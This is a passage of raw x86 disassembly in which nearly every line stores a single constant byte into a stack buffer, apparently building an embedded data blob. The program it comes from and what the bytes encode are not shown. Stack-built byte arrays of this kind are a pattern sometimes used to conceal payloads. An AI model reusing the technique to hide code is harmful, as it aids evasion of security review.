  404d53:	c6 85 d1 e8 ff ff 30 	mov    BYTE PTR [ebp-0x172f],0x30
  404d5a:	c6 85 d2 e8 ff ff c0 	mov    BYTE PTR [ebp-0x172e],0xc0
  404d61:	c6 85 d3 e8 ff ff e0 	mov    BYTE PTR [ebp-0x172d],0xe0
  404d68:	c6 85 d4 e8 ff ff c0 	mov    BYTE PTR [ebp-0x172c],0xc0
  404d6f:	c6 85 d5 e8 ff ff 20 	mov    BYTE PTR [ebp-0x172b],0x20
  404d76:	c6 85 d6 e8 ff ff 60 	mov    BYTE PTR [ebp-0x172a],0x60
  404d7d:	c6 85 d7 e8 ff ff 10 	mov    BYTE PTR [ebp-0x1729],0x10
  404d84:	c6 85 d8 e8 ff ff 80 	mov    BYTE PTR [ebp-0x1728],0x80
  404d8b:	c6 85 d9 e8 ff ff 50 	mov    BYTE PTR [ebp-0x1727],0x50
  404d92:	c6 85 da e8 ff ff 20 	mov    BYTE PTR [ebp-0x1726],0x20
  404d99:	c6 85 db e8 ff ff 40 	mov    BYTE PTR [ebp-0x1725],0x40
  404da0:	88 9d dc e8 ff ff    	mov    BYTE PTR [ebp-0x1724],bl
  404da6:	c6 85 dd e8 ff ff b0 	mov    BYTE PTR [ebp-0x1723],0xb0
  404dad:	c6 85 de e8 ff ff 60 	mov    BYTE PTR [ebp-0x1722],0x60
  404db4:	c6 85 df e8 ff ff 30 	mov    BYTE PTR [ebp-0x1721],0x30
  404dbb:	88 9d e0 e8 ff ff    	mov    BYTE PTR [ebp-0x1720],bl
  404dc1:	c6 85 e1 e8 ff ff c0 	mov    BYTE PTR [ebp-0x171f],0xc0
  404dc8:	c6 85 e2 e8 ff ff 20 	mov    BYTE PTR [ebp-0x171e],0x20
  404dcf:	c6 85 e3 e8 ff ff 90 	mov    BYTE PTR [ebp-0x171d],0x90
  404dd6:	88 9d e4 e8 ff ff    	mov    BYTE PTR [ebp-0x171c],bl
  404ddc:	c6 85 e5 e8 ff ff 90 	mov    BYTE PTR [ebp-0x171b],0x90
  404de3:	c6 85 e6 e8 ff ff 40 	mov    BYTE PTR [ebp-0x171a],0x40
  404dea:	c6 85 e7 e8 ff ff b0 	mov    BYTE PTR [ebp-0x1719],0xb0
  404df1:	c6 85 e8 e8 ff ff 80 	mov    BYTE PTR [ebp-0x1718],0x80
  404df8:	c6 85 e9 e8 ff ff c0 	mov    BYTE PTR [ebp-0x1717],0xc0
  404dff:	c6 85 ea e8 ff ff c0 	mov    BYTE PTR [ebp-0x1716],0xc0
  404e06:	c6 85 eb e8 ff ff 30 	mov    BYTE PTR [ebp-0x1715],0x30
  404e0d:	c6 85 ec e8 ff ff 80 	mov    BYTE PTR [ebp-0x1714],0x80
  404e14:	c6 85 ed e8 ff ff e0 	mov    BYTE PTR [ebp-0x1713],0xe0
  404e1b:	c6 85 ee e8 ff ff 40 	mov    BYTE PTR [ebp-0x1712],0x40
  404e22:	c6 85 ef e8 ff ff 70 	mov    BYTE PTR [ebp-0x1711],0x70
  404e29:	88 9d f0 e8 ff ff    	mov    BYTE PTR [ebp-0x1710],bl
  404e2f:	c6 85 f1 e8 ff ff e0 	mov    BYTE PTR [ebp-0x170f],0xe0
  404e36:	c6 85 f2 e8 ff ff 20 	mov    BYTE PTR [ebp-0x170e],0x20
  404e3d:	c6 85 f3 e8 ff ff 40 	mov    BYTE PTR [ebp-0x170d],0x40
  404e44:	c6 85 f4 e8 ff ff 80 	mov    BYTE PTR [ebp-0x170c],0x80
  404e4b:	c6 85 f5 e8 ff ff e0 	mov    BYTE PTR [ebp-0x170b],0xe0
  404e52:	c6 85 f6 e8 ff ff 60 	mov    BYTE PTR [ebp-0x170a],0x60
  404e59:	c6 85 f7 e8 ff ff 90 	mov    BYTE PTR [ebp-0x1709],0x90
  404e60:	88 9d f8 e8 ff ff    	mov    BYTE PTR [ebp-0x1708],bl
  404e66:	c6 85 f9 e8 ff ff 10 	mov    BYTE PTR [ebp-0x1707],0x10
  404e6d:	c6 85 fa e8 ff ff 80 	mov    BYTE PTR [ebp-0x1706],0x80
  404e74:	c6 85 fb e8 ff ff f0 	mov    BYTE PTR [ebp-0x1705],0xf0
  404e7b:	c6 85 fc e8 ff ff c0 	mov    BYTE PTR [ebp-0x1704],0xc0
  404e82:	c6 85 fd e8 ff ff 60 	mov    BYTE PTR [ebp-0x1703],0x60
  404e89:	c6 85 fe e8 ff ff 60 	mov    BYTE PTR [ebp-0x1702],0x60
  404e90:	c6 85 ff e8 ff ff 50 	mov    BYTE PTR [ebp-0x1701],0x50
  404e97:	88 9d 00 e9 ff ff    	mov    BYTE PTR [ebp-0x1700],bl
  404e9d:	c6 85 01 e9 ff ff d0 	mov    BYTE PTR [ebp-0x16ff],0xd0
  404ea4:	88 9d 02 e9 ff ff    	mov    BYTE PTR [ebp-0x16fe],bl
  404eaa:	c6 85 03 e9 ff ff e0 	mov    BYTE PTR [ebp-0x16fd],0xe0
  404eb1:	c6 85 04 e9 ff ff c0 	mov    BYTE PTR [ebp-0x16fc],0xc0
  404eb8:	c6 85 05 e9 ff ff 10 	mov    BYTE PTR [ebp-0x16fb],0x10
  404ebf:	c6 85 06 e9 ff ff c0 	mov    BYTE PTR [ebp-0x16fa],0xc0
  404ec6:	c6 85 07 e9 ff ff 10 	mov    BYTE PTR [ebp-0x16f9],0x10
  404ecd:	88 9d 08 e9 ff ff    	mov    BYTE PTR [ebp-0x16f8],bl
  404ed3:	c6 85 09 e9 ff ff 40 	mov    BYTE PTR [ebp-0x16f7],0x40
  404eda:	88 9d 0a e9 ff ff    	mov    BYTE PTR [ebp-0x16f6],bl
  404ee0:	c6 85 0b e9 ff ff 80 	mov    BYTE PTR [ebp-0x16f5],0x80
  404ee7:	c6 85 0c e9 ff ff 40 	mov    BYTE PTR [ebp-0x16f4],0x40
  404eee:	c6 85 0d e9 ff ff 20 	mov    BYTE PTR [ebp-0x16f3],0x20
  404ef5:	c6 85 0e e9 ff ff 40 	mov    BYTE PTR [ebp-0x16f2],0x40
  404efc:	c6 85 0f e9 ff ff f0 	mov    BYTE PTR [ebp-0x16f1],0xf0
  404f03:	88 9d 10 e9 ff ff    	mov    BYTE PTR [ebp-0x16f0],bl
  404f09:	c6 85 11 e9 ff ff d0 	mov    BYTE PTR [ebp-0x16ef],0xd0
  404f10:	c6 85 12 e9 ff ff 80 	mov    BYTE PTR [ebp-0x16ee],0x80
  404f17:	c6 85 13 e9 ff ff 20 	mov    BYTE PTR [ebp-0x16ed],0x20
  404f1e:	c6 85 14 e9 ff ff c0 	mov    BYTE PTR [ebp-0x16ec],0xc0
  404f25:	c6 85 15 e9 ff ff 10 	mov    BYTE PTR [ebp-0x16eb],0x10
  404f2c:	c6 85 16 e9 ff ff 20 	mov    BYTE PTR [ebp-0x16ea],0x20
  404f33:	c6 85 17 e9 ff ff f0 	mov    BYTE PTR [ebp-0x16e9],0xf0
  404f3a:	c6 85 18 e9 ff ff 80 	mov    BYTE PTR [ebp-0x16e8],0x80
  404f41:	c6 85 19 e9 ff ff 50 	mov    BYTE PTR [ebp-0x16e7],0x50
  404f48:	c6 85 1a e9 ff ff 40 	mov    BYTE PTR [ebp-0x16e6],0x40
  404f4f:	c6 85 1b e9 ff ff e0 	mov    BYTE PTR [ebp-0x16e5],0xe0
  404f56:	88 9d 1c e9 ff ff    	mov    BYTE PTR [ebp-0x16e4],bl
  404f5c:	c6 85 1d e9 ff ff f0 	mov    BYTE PTR [ebp-0x16e3],0xf0
  404f63:	c6 85 1e e9 ff ff 80 	mov    BYTE PTR [ebp-0x16e2],0x80
  404f6a:	88 9d 1f e9 ff ff    	mov    BYTE PTR [ebp-0x16e1],bl
  404f70:	88 9d 20 e9 ff ff    	mov    BYTE PTR [ebp-0x16e0],bl
  404f76:	c6 85 21 e9 ff ff d0 	mov    BYTE PTR [ebp-0x16df],0xd0
  404f7d:	c6 85 22 e9 ff ff 40 	mov    BYTE PTR [ebp-0x16de],0x40
  404f84:	c6 85 23 e9 ff ff 20 	mov    BYTE PTR [ebp-0x16dd],0x20
  404f8b:	88 9d 24 e9 ff ff    	mov    BYTE PTR [ebp-0x16dc],bl
  404f91:	c6 85 25 e9 ff ff f0 	mov    BYTE PTR [ebp-0x16db],0xf0
  404f98:	c6 85 26 e9 ff ff e0 	mov    BYTE PTR [ebp-0x16da],0xe0
  404f9f:	c6 85 27 e9 ff ff c0 	mov    BYTE PTR [ebp-0x16d9],0xc0
  404fa6:	88 9d 28 e9 ff ff    	mov    BYTE PTR [ebp-0x16d8],bl
  404fac:	c6 85 29 e9 ff ff 70 	mov    BYTE PTR [ebp-0x16d7],0x70
  404fb3:	c6 85 2a e9 ff ff 20 	mov    BYTE PTR [ebp-0x16d6],0x20
  404fba:	c6 85 2b e9 ff ff 30 	mov    BYTE PTR [ebp-0x16d5],0x30
  404fc1:	c6 85 2c e9 ff ff 80 	mov    BYTE PTR [ebp-0x16d4],0x80
  404fc8:	c6 85 2d e9 ff ff b0 	mov    BYTE PTR [ebp-0x16d3],0xb0
  404fcf:	c6 85 2e e9 ff ff 40 	mov    BYTE PTR [ebp-0x16d2],0x40
  404fd6:	88 9d 2f e9 ff ff    	mov    BYTE PTR [ebp-0x16d1],bl
  404fdc:	88 9d 30 e9 ff ff    	mov    BYTE PTR [ebp-0x16d0],bl
  404fe2:	c6 85 31 e9 ff ff c0 	mov    BYTE PTR [ebp-0x16cf],0xc0
  404fe9:	c6 85 32 e9 ff ff 60 	mov    BYTE PTR [ebp-0x16ce],0x60
  404ff0:	88 9d 33 e9 ff ff    	mov    BYTE PTR [ebp-0x16cd],bl
  404ff6:	88 9d 34 e9 ff ff    	mov    BYTE PTR [ebp-0x16cc],bl
  404ffc:	c6 85 35 e9 ff ff 20 	mov    BYTE PTR [ebp-0x16cb],0x20
  405003:	c6 85 36 e9 ff ff 80 	mov    BYTE PTR [ebp-0x16ca],0x80
  40500a:	c6 85 37 e9 ff ff 90 	mov    BYTE PTR [ebp-0x16c9],0x90
  405011:	88 9d 38 e9 ff ff    	mov    BYTE PTR [ebp-0x16c8],bl
  405017:	c6 85 39 e9 ff ff 30 	mov    BYTE PTR [ebp-0x16c7],0x30
  40501e:	c6 85 3a e9 ff ff 60 	mov    BYTE PTR [ebp-0x16c6],0x60
  405025:	c6 85 3b e9 ff ff 70 	mov    BYTE PTR [ebp-0x16c5],0x70
  40502c:	88 9d 3c e9 ff ff    	mov    BYTE PTR [ebp-0x16c4],bl
  405032:	c6 85 3d e9 ff ff 20 	mov    BYTE PTR [ebp-0x16c3],0x20
  405039:	c6 85 3e e9 ff ff 60 	mov    BYTE PTR [ebp-0x16c2],0x60
  405040:	88 9d 3f e9 ff ff    	mov    BYTE PTR [ebp-0x16c1],bl
  405046:	88 9d 40 e9 ff ff    	mov    BYTE PTR [ebp-0x16c0],bl
  40504c:	c6 85 41 e9 ff ff d0 	mov    BYTE PTR [ebp-0x16bf],0xd0
  405053:	c6 85 42 e9 ff ff e0 	mov    BYTE PTR [ebp-0x16be],0xe0
  40505a:	c6 85 43 e9 ff ff e0 	mov    BYTE PTR [ebp-0x16bd],0xe0
  405061:	c6 85 44 e9 ff ff 40 	mov    BYTE PTR [ebp-0x16bc],0x40
  405068:	88 9d 45 e9 ff ff    	mov    BYTE PTR [ebp-0x16bb],bl
  40506e:	c6 85 46 e9 ff ff e0 	mov    BYTE PTR [ebp-0x16ba],0xe0
  405075:	c6 85 47 e9 ff ff 30 	mov    BYTE PTR [ebp-0x16b9],0x30
  40507c:	88 9d 48 e9 ff ff    	mov    BYTE PTR [ebp-0x16b8],bl
  405082:	c6 85 49 e9 ff ff 90 	mov    BYTE PTR [ebp-0x16b7],0x90
  405089:	c6 85 4a e9 ff ff a0 	mov    BYTE PTR [ebp-0x16b6],0xa0
  405090:	88 9d 4b e9 ff ff    	mov    BYTE PTR [ebp-0x16b5],bl
  405096:	c6 85 4c e9 ff ff 80 	mov    BYTE PTR [ebp-0x16b4],0x80
  40509d:	c6 85 4d e9 ff ff 20 	mov    BYTE PTR [ebp-0x16b3],0x20
  4050a4:	88 9d 4e e9 ff ff    	mov    BYTE PTR [ebp-0x16b2],bl
  4050aa:	c6 85 4f e9 ff ff 40 	mov    BYTE PTR [ebp-0x16b1],0x40
  4050b1:	88 9d 50 e9 ff ff    	mov    BYTE PTR [ebp-0x16b0],bl
  4050b7:	c6 85 51 e9 ff ff 70 	mov    BYTE PTR [ebp-0x16af],0x70
  4050be:	c6 85 52 e9 ff ff 40 	mov    BYTE PTR [ebp-0x16ae],0x40
  4050c5:	c6 85 53 e9 ff ff 40 	mov    BYTE PTR [ebp-0x16ad],0x40
  4050cc:	c6 85 54 e9 ff ff 40 	mov    BYTE PTR [ebp-0x16ac],0x40
  4050d3:	c6 85 55 e9 ff ff c0 	mov    BYTE PTR [ebp-0x16ab],0xc0
  4050da:	c6 85 56 e9 ff ff 60 	mov    BYTE PTR [ebp-0x16aa],0x60
  4050e1:	c6 85 57 e9 ff ff 30 	mov    BYTE PTR [ebp-0x16a9],0x30
  4050e8:	88 9d 58 e9 ff ff    	mov    BYTE PTR [ebp-0x16a8],bl
  4050ee:	c6 85 59 e9 ff ff b0 	mov    BYTE PTR [ebp-0x16a7],0xb0
  4050f5:	c6 85 5a e9 ff ff 20 	mov    BYTE PTR [ebp-0x16a6],0x20
  4050fc:	88 9d 5b e9 ff ff    	mov    BYTE PTR [ebp-0x16a5],bl
  405102:	88 9d 5c e9 ff ff    	mov    BYTE PTR [ebp-0x16a4],bl
  405108:	c6 85 5d e9 ff ff a0 	mov    BYTE PTR [ebp-0x16a3],0xa0
  40510f:	c6 85 5e e9 ff ff 60 	mov    BYTE PTR [ebp-0x16a2],0x60
  405116:	88 9d 5f e9 ff ff    	mov    BYTE PTR [ebp-0x16a1],bl
  40511c:	88 9d 60 e9 ff ff    	mov    BYTE PTR [ebp-0x16a0],bl
  405122:	c6 85 61 e9 ff ff 50 	mov    BYTE PTR [ebp-0x169f],0x50
  405129:	c6 85 62 e9 ff ff 40 	mov    BYTE PTR [ebp-0x169e],0x40
  405130:	c6 85 63 e9 ff ff a0 	mov    BYTE PTR [ebp-0x169d],0xa0
  405137:	c6 85 64 e9 ff ff 80 	mov    BYTE PTR [ebp-0x169c],0x80
  40513e:	c6 85 65 e9 ff ff b0 	mov    BYTE PTR [ebp-0x169b],0xb0
  405145:	c6 85 66 e9 ff ff c0 	mov    BYTE PTR [ebp-0x169a],0xc0
  40514c:	c6 85 67 e9 ff ff b0 	mov    BYTE PTR [ebp-0x1699],0xb0
  405153:	88 9d 68 e9 ff ff    	mov    BYTE PTR [ebp-0x1698],bl
  405159:	c6 85 69 e9 ff ff d0 	mov    BYTE PTR [ebp-0x1697],0xd0
  405160:	c6 85 6a e9 ff ff a0 	mov    BYTE PTR [ebp-0x1696],0xa0
  405167:	c6 85 6b e9 ff ff b0 	mov    BYTE PTR [ebp-0x1695],0xb0
  40516e:	88 9d 6c e9 ff ff    	mov    BYTE PTR [ebp-0x1694],bl
  405174:	c6 85 6d e9 ff ff f0 	mov    BYTE PTR [ebp-0x1693],0xf0
  40517b:	c6 85 6e e9 ff ff e0 	mov    BYTE PTR [ebp-0x1692],0xe0
  405182:	c6 85 6f e9 ff ff d0 	mov    BYTE PTR [ebp-0x1691],0xd0
  405189:	88 9d 70 e9 ff ff    	mov    BYTE PTR [ebp-0x1690],bl
  40518f:	c6 85 71 e9 ff ff f0 	mov    BYTE PTR [ebp-0x168f],0xf0
  405196:	c6 85 72 e9 ff ff e0 	mov    BYTE PTR [ebp-0x168e],0xe0
  40519d:	c6 85 73 e9 ff ff 90 	mov    BYTE PTR [ebp-0x168d],0x90
  4051a4:	c6 85 74 e9 ff ff 80 	mov    BYTE PTR [ebp-0x168c],0x80
  4051ab:	c6 85 75 e9 ff ff c0 	mov    BYTE PTR [ebp-0x168b],0xc0
  4051b2:	c6 85 76 e9 ff ff c0 	mov    BYTE PTR [ebp-0x168a],0xc0
  4051b9:	c6 85 77 e9 ff ff 70 	mov    BYTE PTR [ebp-0x1689],0x70
  4051c0:	c6 85 78 e9 ff ff 80 	mov    BYTE PTR [ebp-0x1688],0x80
  4051c7:	c6 85 79 e9 ff ff 60 	mov    BYTE PTR [ebp-0x1687],0x60
  4051ce:	c6 85 7a e9 ff ff 60 	mov    BYTE PTR [ebp-0x1686],0x60
  4051d5:	c6 85 7b e9 ff ff 50 	mov    BYTE PTR [ebp-0x1685],0x50
  4051dc:	c6 85 7c e9 ff ff c0 	mov    BYTE PTR [ebp-0x1684],0xc0
  4051e3:	c6 85 7d e9 ff ff a0 	mov    BYTE PTR [ebp-0x1683],0xa0
  4051ea:	c6 85 7e e9 ff ff a0 	mov    BYTE PTR [ebp-0x1682],0xa0
  4051f1:	c6 85 7f e9 ff ff d0 	mov    BYTE PTR [ebp-0x1681],0xd0
  4051f8:	88 9d 80 e9 ff ff    	mov    BYTE PTR [ebp-0x1680],bl
  4051fe:	88 9d 81 e9 ff ff    	mov    BYTE PTR [ebp-0x167f],bl
  405204:	88 9d 82 e9 ff ff    	mov    BYTE PTR [ebp-0x167e],bl
  40520a:	c6 85 83 e9 ff ff 30 	mov    BYTE PTR [ebp-0x167d],0x30
  405211:	c6 85 84 e9 ff ff 40 	mov    BYTE PTR [ebp-0x167c],0x40
  405218:	c6 85 85 e9 ff ff 10 	mov    BYTE PTR [ebp-0x167b],0x10
  40521f:	c6 85 86 e9 ff ff 40 	mov    BYTE PTR [ebp-0x167a],0x40
  405226:	c6 85 87 e9 ff ff 10 	mov    BYTE PTR [ebp-0x1679],0x10
  40522d:	c6 85 88 e9 ff ff 80 	mov    BYTE PTR [ebp-0x1678],0x80
  405234:	c6 85 89 e9 ff ff b0 	mov    BYTE PTR [ebp-0x1677],0xb0
  40523b:	c6 85 8a e9 ff ff 20 	mov    BYTE PTR [ebp-0x1676],0x20
  405242:	c6 85 8b e9 ff ff a0 	mov    BYTE PTR [ebp-0x1675],0xa0
  405249:	88 9d 8c e9 ff ff    	mov    BYTE PTR [ebp-0x1674],bl
  40524f:	c6 85 8d e9 ff ff 90 	mov    BYTE PTR [ebp-0x1673],0x90
  405256:	c6 85 8e e9 ff ff 80 	mov    BYTE PTR [ebp-0x1672],0x80
  40525d:	c6 85 8f e9 ff ff 10 	mov    BYTE PTR [ebp-0x1671],0x10
  405264:	88 9d 90 e9 ff ff    	mov    BYTE PTR [ebp-0x1670],bl
  40526a:	c6 85 91 e9 ff ff e0 	mov    BYTE PTR [ebp-0x166f],0xe0
  405271:	c6 85 92 e9 ff ff 40 	mov    BYTE PTR [ebp-0x166e],0x40
  405278:	c6 85 93 e9 ff ff c0 	mov    BYTE PTR [ebp-0x166d],0xc0
  40527f:	c6 85 94 e9 ff ff 40 	mov    BYTE PTR [ebp-0x166c],0x40
  405286:	c6 85 95 e9 ff ff f0 	mov    BYTE PTR [ebp-0x166b],0xf0
  40528d:	c6 85 96 e9 ff ff e0 	mov    BYTE PTR [ebp-0x166a],0xe0
  405294:	c6 85 97 e9 ff ff 30 	mov    BYTE PTR [ebp-0x1669],0x30
  40529b:	88 9d 98 e9 ff ff    	mov    BYTE PTR [ebp-0x1668],bl
  4052a1:	c6 85 99 e9 ff ff b0 	mov    BYTE PTR [ebp-0x1667],0xb0
  4052a8:	88 9d 9a e9 ff ff    	mov    BYTE PTR [ebp-0x1666],bl
  4052ae:	c6 85 9b e9 ff ff 70 	mov    BYTE PTR [ebp-0x1665],0x70
  4052b5:	c6 85 9c e9 ff ff c0 	mov    BYTE PTR [ebp-0x1664],0xc0
  4052bc:	c6 85 9d e9 ff ff f0 	mov    BYTE PTR [ebp-0x1663],0xf0
  4052c3:	c6 85 9e e9 ff ff 80 	mov    BYTE PTR [ebp-0x1662],0x80
  4052ca:	c6 85 9f e9 ff ff 50 	mov    BYTE PTR [ebp-0x1661],0x50
  4052d1:	88 9d a0 e9 ff ff    	mov    BYTE PTR [ebp-0x1660],bl
  4052d7:	88 9d a1 e9 ff ff    	mov    BYTE PTR [ebp-0x165f],bl
  4052dd:	c6 85 a2 e9 ff ff 60 	mov    BYTE PTR [ebp-0x165e],0x60
  4052e4:	c6 85 a3 e9 ff ff 10 	mov    BYTE PTR [ebp-0x165d],0x10
  4052eb:	c6 85 a4 e9 ff ff c0 	mov    BYTE PTR [ebp-0x165c],0xc0
  4052f2:	c6 85 a5 e9 ff ff 90 	mov    BYTE PTR [ebp-0x165b],0x90
  4052f9:	c6 85 a6 e9 ff ff 20 	mov    BYTE PTR [ebp-0x165a],0x20
  405300:	c6 85 a7 e9 ff ff b0 	mov    BYTE PTR [ebp-0x1659],0xb0
  405307:	88 9d a8 e9 ff ff    	mov    BYTE PTR [ebp-0x1658],bl
  40530d:	c6 85 a9 e9 ff ff 30 	mov    BYTE PTR [ebp-0x1657],0x30
  405314:	c6 85 aa e9 ff ff 20 	mov    BYTE PTR [ebp-0x1656],0x20
  40531b:	c6 85 ab e9 ff ff 20 	mov    BYTE PTR [ebp-0x1655],0x20
  405322:	c6 85 ac e9 ff ff 40 	mov    BYTE PTR [ebp-0x1654],0x40
  405329:	c6 85 ad e9 ff ff 30 	mov    BYTE PTR [ebp-0x1653],0x30
  405330:	c6 85 ae e9 ff ff 80 	mov    BYTE PTR [ebp-0x1652],0x80
  405337:	c6 85 af e9 ff ff b0 	mov    BYTE PTR [ebp-0x1651],0xb0
  40533e:	88 9d b0 e9 ff ff    	mov    BYTE PTR [ebp-0x1650],bl
  405344:	c6 85 b1 e9 ff ff 30 	mov    BYTE PTR [ebp-0x164f],0x30
  40534b:	88 9d b2 e9 ff ff    	mov    BYTE PTR [ebp-0x164e],bl
  405351:	88 9d b3 e9 ff ff    	mov    BYTE PTR [ebp-0x164d],bl
  405357:	c6 85 b4 e9 ff ff 40 	mov    BYTE PTR [ebp-0x164c],0x40
  40535e:	c6 85 b5 e9 ff ff 70 	mov    BYTE PTR [ebp-0x164b],0x70
  405365:	c6 85 b6 e9 ff ff 20 	mov    BYTE PTR [ebp-0x164a],0x20
  40536c:	c6 85 b7 e9 ff ff 60 	mov    BYTE PTR [ebp-0x1649],0x60
  405373:	88 9d b8 e9 ff ff    	mov    BYTE PTR [ebp-0x1648],bl
  405379:	c6 85 b9 e9 ff ff e0 	mov    BYTE PTR [ebp-0x1647],0xe0
  405380:	c6 85 ba e9 ff ff 20 	mov    BYTE PTR [ebp-0x1646],0x20
  405387:	c6 85 bb e9 ff ff c0 	mov    BYTE PTR [ebp-0x1645],0xc0
  40538e:	c6 85 bc e9 ff ff 40 	mov    BYTE PTR [ebp-0x1644],0x40
  405395:	c6 85 bd e9 ff ff d0 	mov    BYTE PTR [ebp-0x1643],0xd0
  40539c:	88 9d be e9 ff ff    	mov    BYTE PTR [ebp-0x1642],bl
  4053a2:	c6 85 bf e9 ff ff 30 	mov    BYTE PTR [ebp-0x1641],0x30
  4053a9:	88 9d c0 e9 ff ff    	mov    BYTE PTR [ebp-0x1640],bl
  4053af:	c6 85 c1 e9 ff ff 70 	mov    BYTE PTR [ebp-0x163f],0x70
  4053b6:	c6 85 c2 e9 ff ff a0 	mov    BYTE PTR [ebp-0x163e],0xa0
  4053bd:	c6 85 c3 e9 ff ff 70 	mov    BYTE PTR [ebp-0x163d],0x70
  4053c4:	88 9d c4 e9 ff ff    	mov    BYTE PTR [ebp-0x163c],bl
  4053ca:	c6 85 c5 e9 ff ff 10 	mov    BYTE PTR [ebp-0x163b],0x10
  4053d1:	c6 85 c6 e9 ff ff e0 	mov    BYTE PTR [ebp-0x163a],0xe0
  4053d8:	c6 85 c7 e9 ff ff b0 	mov    BYTE PTR [ebp-0x1639],0xb0
  4053df:	88 9d c8 e9 ff ff    	mov    BYTE PTR [ebp-0x1638],bl
  4053e5:	c6 85 c9 e9 ff ff c0 	mov    BYTE PTR [ebp-0x1637],0xc0
  4053ec:	c6 85 ca e9 ff ff 80 	mov    BYTE PTR [ebp-0x1636],0x80
  4053f3:	88 9d cb e9 ff ff    	mov    BYTE PTR [ebp-0x1635],bl
  4053f9:	88 9d cc e9 ff ff    	mov    BYTE PTR [ebp-0x1634],bl
  4053ff:	c6 85 cd e9 ff ff 70 	mov    BYTE PTR [ebp-0x1633],0x70
  405406:	c6 85 ce e9 ff ff 60 	mov    BYTE PTR [ebp-0x1632],0x60
  40540d:	c6 85 cf e9 ff ff 20 	mov    BYTE PTR [ebp-0x1631],0x20
  405414:	88 9d d0 e9 ff ff    	mov    BYTE PTR [ebp-0x1630],bl
  40541a:	c6 85 d1 e9 ff ff b0 	mov    BYTE PTR [ebp-0x162f],0xb0
  405421:	c6 85 d2 e9 ff ff 40 	mov    BYTE PTR [ebp-0x162e],0x40
  405428:	c6 85 d3 e9 ff ff d0 	mov    BYTE PTR [ebp-0x162d],0xd0
  40542f:	c6 85 d4 e9 ff ff c0 	mov    BYTE PTR [ebp-0x162c],0xc0
  405436:	c6 85 d5 e9 ff ff 10 	mov    BYTE PTR [ebp-0x162b],0x10
  40543d:	c6 85 d6 e9 ff ff 80 	mov    BYTE PTR [ebp-0x162a],0x80
  405444:	c6 85 d7 e9 ff ff c0 	mov    BYTE PTR [ebp-0x1629],0xc0
  40544b:	88 9d d8 e9 ff ff    	mov    BYTE PTR [ebp-0x1628],bl
  405451:	c6 85 d9 e9 ff ff 60 	mov    BYTE PTR [ebp-0x1627],0x60
  405458:	c6 85 da e9 ff ff 80 	mov    BYTE PTR [ebp-0x1626],0x80
  40545f:	88 9d db e9 ff ff    	mov    BYTE PTR [ebp-0x1625],bl
  405465:	c6 85 dc e9 ff ff c0 	mov    BYTE PTR [ebp-0x1624],0xc0
  40546c:	c6 85 dd e9 ff ff c0 	mov    BYTE PTR [ebp-0x1623],0xc0
  405473:	88 9d de e9 ff ff    	mov    BYTE PTR [ebp-0x1622],bl
  405479:	c6 85 df e9 ff ff 80 	mov    BYTE PTR [ebp-0x1621],0x80
  405480:	88 9d e0 e9 ff ff    	mov    BYTE PTR [ebp-0x1620],bl
  405486:	88 9d e1 e9 ff ff    	mov    BYTE PTR [ebp-0x161f],bl
  40548c:	c6 85 e2 e9 ff ff 80 	mov    BYTE PTR [ebp-0x161e],0x80
  405493:	c6 85 e3 e9 ff ff 10 	mov    BYTE PTR [ebp-0x161d],0x10
  40549a:	88 9d e4 e9 ff ff    	mov    BYTE PTR [ebp-0x161c],bl
  4054a0:	c6 85 e5 e9 ff ff 70 	mov    BYTE PTR [ebp-0x161b],0x70
  4054a7:	c6 85 e6 e9 ff ff 20 	mov    BYTE PTR [ebp-0x161a],0x20
  4054ae:	c6 85 e7 e9 ff ff 50 	mov    BYTE PTR [ebp-0x1619],0x50
  4054b5:	c6 85 e8 e9 ff ff 80 	mov    BYTE PTR [ebp-0x1618],0x80
  4054bc:	c6 85 e9 e9 ff ff a0 	mov    BYTE PTR [ebp-0x1617],0xa0
  4054c3:	c6 85 ea e9 ff ff 60 	mov    BYTE PTR [ebp-0x1616],0x60
  4054ca:	c6 85 eb e9 ff ff e0 	mov    BYTE PTR [ebp-0x1615],0xe0
  4054d1:	c6 85 ec e9 ff ff 40 	mov    BYTE PTR [ebp-0x1614],0x40
  4054d8:	c6 85 ed e9 ff ff 40 	mov    BYTE PTR [ebp-0x1613],0x40
  4054df:	c6 85 ee e9 ff ff 20 	mov    BYTE PTR [ebp-0x1612],0x20
  4054e6:	c6 85 ef e9 ff ff b0 	mov    BYTE PTR [ebp-0x1611],0xb0
  4054ed:	88 9d f0 e9 ff ff    	mov    BYTE PTR [ebp-0x1610],bl
  4054f3:	c6 85 f1 e9 ff ff 90 	mov    BYTE PTR [ebp-0x160f],0x90
  4054fa:	c6 85 f2 e9 ff ff 60 	mov    BYTE PTR [ebp-0x160e],0x60
  405501:	c6 85 f3 e9 ff ff c0 	mov    BYTE PTR [ebp-0x160d],0xc0
  405508:	c6 85 f4 e9 ff ff c0 	mov    BYTE PTR [ebp-0x160c],0xc0
  40550f:	c6 85 f5 e9 ff ff 60 	mov    BYTE PTR [ebp-0x160b],0x60
  405516:	c6 85 f6 e9 ff ff 20 	mov    BYTE PTR [ebp-0x160a],0x20
  40551d:	c6 85 f7 e9 ff ff 70 	mov    BYTE PTR [ebp-0x1609],0x70
  405524:	88 9d f8 e9 ff ff    	mov    BYTE PTR [ebp-0x1608],bl
  40552a:	c6 85 f9 e9 ff ff 40 	mov    BYTE PTR [ebp-0x1607],0x40
  405531:	c6 85 fa e9 ff ff 80 	mov    BYTE PTR [ebp-0x1606],0x80
  405538:	c6 85 fb e9 ff ff 90 	mov    BYTE PTR [ebp-0x1605],0x90
  40553f:	c6 85 fc e9 ff ff 40 	mov    BYTE PTR [ebp-0x1604],0x40
  405546:	c6 85 fd e9 ff ff 50 	mov    BYTE PTR [ebp-0x1603],0x50
  40554d:	88 9d fe e9 ff ff    	mov    BYTE PTR [ebp-0x1602],bl
  405553:	88 9d ff e9 ff ff    	mov    BYTE PTR [ebp-0x1601],bl
  405559:	c6 85 00 ea ff ff 81 	mov    BYTE PTR [ebp-0x1600],0x81
  405560:	c6 85 01 ea ff ff ec 	mov    BYTE PTR [ebp-0x15ff],0xec
  405567:	c6 85 02 ea ff ff d4 	mov    BYTE PTR [ebp-0x15fe],0xd4
  40556e:	c6 85 03 ea ff ff 58 	mov    BYTE PTR [ebp-0x15fd],0x58
  405575:	c6 85 04 ea ff ff c0 	mov    BYTE PTR [ebp-0x15fc],0xc0
  40557c:	c6 85 05 ea ff ff 90 	mov    BYTE PTR [ebp-0x15fb],0x90
  405583:	c6 85 06 ea ff ff b8 	mov    BYTE PTR [ebp-0x15fa],0xb8
  40558a:	c6 85 07 ea ff ff 55 	mov    BYTE PTR [ebp-0x15f9],0x55
